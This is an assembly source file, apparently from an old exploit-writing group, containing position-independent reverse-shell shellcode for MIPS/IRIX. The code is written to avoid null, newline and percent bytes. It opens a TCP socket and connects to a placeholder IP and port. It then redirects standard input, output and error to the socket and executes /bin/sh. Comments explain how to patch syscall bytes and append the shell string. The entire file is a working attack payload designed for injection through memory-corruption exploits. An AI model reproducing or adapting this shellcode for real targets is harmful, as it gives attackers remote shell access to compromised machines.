/* MIPS/IRIX PIC connect shell shellcode
 * no 0x00, 0x0a, 0x0d, 0x25 bytes
 *
 * -sc
 */

	/* XXX: replace syscall instructions with "\x01\x01\x01\x0c" */

#include <sgidefs.h>
#include <sys/regdef.h>
#include <sys/asm.h>
#include <sys.s>
#include <sys/syscall.h>
#include <elf.h>

	.section .text

	.globl	cbegin
	.globl	cend

cbegin:
	.set	noreorder
	.set	nomacro

	/* socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)
	 */
	li	s6, 0x7350
	subu	a0, s6, 0x734e	/* AF_INET = 2 */
	subu	a1, s6, 0x734e	/* SOCK_STREAM = 2 */
	subu	a2, s6, 0x734a	/* IPPROTO_TCP = 6 */
	li	v0, SYS_socket	/* 0x0453 */
	syscall

	/* socket returned in v0, save to a0
	 */
	andi	a0, v0, 0xffff		/* a0 = socket */

	/* build struct sockaddr_in
	 * 0x0002port 0x_IP-addr_ 0x00000000 0x00000000
	 */
	subu	t2, s6, 0x734e		/* t2 = 0x0002 */
	sh	t2, -16(sp)
	li	t2, 0x4141		/* t2 = port number */
	sh	t2, -14(sp)

	/* ip address */
	lui	t2, 0x4142
	ori	t2, t2, 0x4344
	sw	t2, -12(sp)

	sw	zero, -8(sp)
	sw	zero, -4(sp)

	/* connect (socket, (struct sockaddr *) cs,
	 *	sizeof (struct sockaddr_in)
	 */
	subu	a2, s6, 0x7340	/* a2 = sizeof (struct sockaddr_in) = 0x10 */
	subu	a1, sp, a2	/* a1 = (struct sockaddr *) */
	li	v0, SYS_connect	/* 0x0443 */
	syscall

	/* dup2 (sock, 0), dup2 (sock, 1), dup2 (sock, 2)
	 */
	subu	s3, s6, 0x431e	/* s3 = 0x3032 (0x3030 = dummy, 0x0002 = STDERR_FILENO) */

	/* socket returned in v0, save in s7
	 */
	andi	s7, a0, 0xffff

	/* dup is emulated through close and fcntl, since irix offers no
	 * native dup syscall as for example linux. see phrack 56 for details
	 */
dup_loop:
	andi	a0, s3, 0x0103	/* a0 = STD*_FILENO */
	li	v0, SYS_close	/* 0x03ee */
	syscall

	andi	a0, s7, 0xffff	/* a0 = socket */
	slti	a1, zero, -1	/* a1 = 0 */
	andi	a2, s3, 0x0103	/* a2 = STD*_FILENO */
	li	v0, SYS_fcntl	/* 0x0426 */
	syscall

	subu	s3, 0x1011
	bgez	s3, dup_loop

	/* execve ("/bin/sh", &{"/bin/sh",NULL}, NULL)
	 */
	sw	zero, -4(sp)

	/* a2 (envp) is already zero due to the dup_loop
	 */
gaddr:	bltzal	zero, gaddr	/* rock on-. lsd */
	subu	a1, sp, 8

	/* ra contains the proper address now */
	addu	ra, ra, 0x0120	/* add 32 + 0x0100 */

	add	a0, ra, -(8 + 0x100)
	sb	zero, -(1 + 0x100)(ra)	/* store NUL */
	sw	a0, -8(sp)
	li	v0, SYS_execve
	syscall

	.end	cbegin
cend:

	/* XXX append here: "/bin/sh\x42" */

